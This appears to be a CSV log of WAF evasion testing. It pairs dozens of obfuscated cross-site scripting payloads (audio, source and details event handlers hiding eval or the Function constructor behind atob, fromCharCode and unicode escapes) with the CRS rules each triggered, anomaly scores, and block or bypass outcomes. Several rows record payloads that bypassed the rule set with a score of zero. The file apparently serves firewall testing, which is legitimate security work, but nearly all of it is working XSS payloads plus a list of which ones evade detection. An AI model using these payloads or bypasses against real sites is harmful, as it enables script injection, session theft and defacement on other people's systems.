index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
7,"<audio src onerror=Function('eva'+'l(String.fromCharCode(97,108,101,114,116,40,49,41))')()>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o37,19v217,91 || o37,19v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760330720.478353
9,"<audio src onerror=Function(['eval','(String.fromCharCode(97,108,101,114,116,40,49,41))'].join(''))()>",0,1,block,5,"934100,941100,941120,941160,949110","o38,19v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603307435.922102
14,"<audio src onerror=Function('return\u0020eval')()(String.fromCharCode(97,108,101,114,116,40,49,41))>",0,1,block,5,"934100,941100,941120,941160,949110","o50,19v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603307884.694573
18,"<audio src onerror=Function(['ev','al(String.fromCharCode(97,108,101,114,116,40,49,41))'].join``)()>",0,1,block,5,"934100,941100,941120,941160,949110","o38,19v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603308234.160490
21,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');eval(a);})()""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o62,5v217,85 || o63,12v217,85 || o25,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603308550.666586
22,"<audio><source onerror=""((function(){var a=String.fromCharCode(97,108,101,114,116,40,49,41);eval(a);})())""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o91,5v217,115 || o92,13v217,115 || o26,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603308678.718289
24,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');window['ev'+'al'](a);})())""></audio>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o70,20v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,100 || o26,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,17v217,100t:urlDecodeUni,t:compressWhitespace || ",35,177603308876.268036
26,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');[]['constructor']['constructor'](a)()})()""></audio>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o63,41v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309058.579691
27,"<audio><source onerror=""((function(){return eval(atob('YWxlcnQoMSk='))})())""></audio>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o44,31v217,85 || o26,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309171.417690
28,"<audio><source onerror=""(function(){this['e\u0076\u0061l'](atob('YWxlcnQoMSk='))})()""></audio>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o25,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,22v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603309223.662388
29,"<audio><source onerror=""(function(){var a=atob`YWxlcnQoMSk=`;eval(a)})()""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o60,5v217,82 || o61,11v217,82 || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603309332.681344
30,"<audio><source onerror=""((function(){var a=window['at'+'ob']('YWxlcnQoMSk=');eval(a);})())""></audio>",0,1,block,10,"932100,933160,933210,934100,934100,941100,941120,941160,941370,949110","o76,5v217,100 || o77,13v217,100 || o49,41v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,100 || o26,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,17v217,100t:urlDecodeUni,t:compressWhitespace || ",45,177603309423.953617
31,"<audio><source onerror=""(function(){return Function(atob('YWxlcnQoMSk='))()})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603309564.047215
32,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');setTimeout(a)})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603309520.936219
33,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');new Function(a)()})())""></audio>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o76,10v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309655.814546
34,"<audio><source onerror=""(function(){location='javascript:'+atob('YWxlcnQoMSk=')})()""></audio>",0,1,block,9,"934100,934100,941100,941120,941140,941160,941170,941210,949110","o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,35v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,41v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603309890.832558
36,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');(0,eval)(a)})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760330994.694221
37,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');globalThis['e\u0076a\u006c'](a);})())""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o26,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603310010.595044
40,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');top['ev'+'al'](a);})())""></audio>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o63,4v217,97 || o67,20v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,97 || o26,11v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,14v217,97t:urlDecodeUni,t:compressWhitespace || ",40,17760331039.760760
41,"<details ontoggle=""(()=>{new Function('\u0061l'+'ert(1)')()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o52,11v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603310497.538443
43,"<details ontoggle=""(()=>{new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()})()"" open></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603310653.094591
44,"<details ontoggle=""(()=>{new Function('al'+'ert(1)')()})()"" OPEN></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,21v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,75 || o25,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603310721.832331
45,"<details ontoggle=""(()=>{new Function(['al'+'ert(1)'][0])()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,26v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760331082.173788
49,"<details ontoggle=""(()=>{new Function('al'+'ert\u00281\u0029')()})()"" open></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,85 || o25,13v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311253.556273
50,"<details ontoggle=""(()=>{new/**/Function('al'+'ert(1)')()})()"" open></details>",0,1,block,4,"933210,941100,941120,949110","o37,21v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603311336.849706
51,"<details ontoggle=""(()=>{new Function(atob('YWxlcnQoMSk='))()})()"" open></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603311466.656493
52,"<details ontoggle=""(()=>{new Function('al'.concat('ert(1)'))()})()"" open></details>",0,1,block,5,"933210,934100,941100,941120,949110","o37,29v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311484.629558
56,"<details ontoggle=""(()=>{new Function('al'+'ert(1)').call()})()"" open></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,80 || o25,13v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603311876.840916
59,"<details ontoggle=""(()=>{new Function(['ale'+'rt(1)'].join())()})()"" open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,30v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,84 || o25,13v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603312198.160848
60,"<details ontoggle=""(()=>{new Function('al'+'ert'+'(1)')()})()""	open></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o37,24v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,78 || o25,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603312243.923082
66,<details ontoggle=(function(){}.constructor('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,4,"934100,941100,941120,949110","o19,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603312896.092920
67,<details ontoggle=(top['Function']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))() open></details>,0,1,block,5,"933210,941100,941120,941370,949110","o18,71v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,15v217,105t:urlDecodeUni,t:compressWhitespace || ",20,177603312997.738946
74,<details ontoggle=(Function('\141\154\145\162\164\05041\051'))() open></details>,0,1,bypass,2,"941100,941120","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760331358.417211
75,<details ontoggle=(Function('\u0061\u006c&#x65;\u0072\u0074(1)'))() open></details>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603313633.416155
78,<details ontoggle=(top.Function('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,bypass,2,"941100,941120","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603313924.702019
79,<details ontoggle=(parent['Function']('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,4,"933210,941100,941120,949110","o18,59v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603314012.497587
80,<details ontoggle=(Function('\u0061\u006c\u0065\u0072\u0074\u00281\u0029'))() open></details>,0,1,bypass,2,"941100,941120","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603314130.012862
81,<details ontoggle=(function(){return(eval)(atob('YWxlcnQoMSk='))}()) open>,0,1,block,5,"933210,934100,941100,941120,949110","o18,50v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603314217.363657
83,<details ontoggle=(top.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603314456.448820
90,<details ontoggle=(function(){return(eval)('al'+'ert(1)')}()) open>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,43v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,67 || o19,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603315187.388222
91,<details ontoggle=(Function.prototype.constructor('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315251.284849
93,<details ontoggle=(self.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315398.013202
94,<details ontoggle=(parent.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315447.650918
95,<details ontoggle=(globalThis.Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941120","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315588.442496
96,"<details ontoggle=(Reflect.construct(Function,['al'+'ert(1)']))() open>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603315684.453579
100,<details ontoggle=(function(){with(this)return(Function('al'+'ert(1)'))}())() open>,0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,59v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o19,11v217,83 || o19,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603316037.678280
105,"<details ontoggle=(window['Function'](String['fromCharCode'](97,108,101,114,116,40,49,41)))() open>",0,1,block,5,"933210,941100,941120,941370,949110","o18,75v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,18v217,99t:urlDecodeUni,t:compressWhitespace || ",20,17760331655.755895
109,<details ontoggle=(self['Function']['constructor']('return\u0020alert')()('1'))() open>,0,1,block,5,"933210,941100,941120,941370,949110","o18,63v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,16v217,87t:urlDecodeUni,t:compressWhitespace || ",20,177603316866.543229
114,<details ontoggle=(globalThis['Function']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))() open>,0,1,block,4,"933210,941100,941120,949110","o18,78v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603317415.398835
117,"<details ontoggle=(parent['Function'](String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41)))() open>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o18,93v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,117 || o38,19v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603317611.547104
121,"<details ontoggle=(Function(String.fromCharCode(97,108,101,114,116,40,49,41)))() open></details>",0,1,block,4,"934100,941100,941120,949110","o28,19v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603318080.909200
124,<details ontoggle=(function(){return{}.constructor.constructor(atob('YWxlcnQoMSk='))()})() open></details>,0,1,block,4,"934100,941100,941120,949110","o19,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603318322.619935
125,<details ontoggle=(top.Function(atob('YWxlcnQoMSk=')))() open></details>,0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603318434.691691
126,<details ontoggle=(self.Function(atob('YWxlcnQoMSk=')))() open></details>,0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603318563.682489
127,<details ontoggle=(window.Function(atob('YWxlcnQoMSk=')))() open></details>,0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603318660.222529
128,<details ontoggle=(Function(atob('YWxlcnQoMSk='))/**/)() open></details>,0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603318791.523866
